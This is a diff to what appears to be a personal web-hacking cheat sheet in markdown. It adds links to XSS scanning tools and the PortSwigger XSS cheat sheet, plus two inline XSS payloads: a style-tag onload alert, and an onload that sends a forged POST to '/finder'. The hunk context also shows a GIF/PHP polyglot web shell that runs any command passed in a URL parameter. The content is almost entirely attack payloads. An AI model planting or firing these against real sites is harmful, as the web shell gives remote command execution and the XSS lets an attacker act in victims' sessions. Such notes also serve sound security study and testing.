@@ -911,8 +911,28 @@ GIF89a; <?php system($_GET['cmd']); ?>
 [xsstrike to find common source ](https://github.com/s0md3v/XSStrike) 
 >-
 >[dalfox](https://github.com/hahwul/dalfox)
->
->
+
+--advance bypass 
+-link
+
+[cheat xss](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+>-
+-> advance for api login 
+```
+<style onload=alert(1)></style>
+```
+-
+```
+<style onload="fetch("/finder", {
+
+method: "POST",
+
+body: "username=cryptocat",
+
+headers: { "Content-Type": "application/x-www-form-urlencoded" },
+
+});"></style>
+
 >-commom source view
 ```
 document.URL
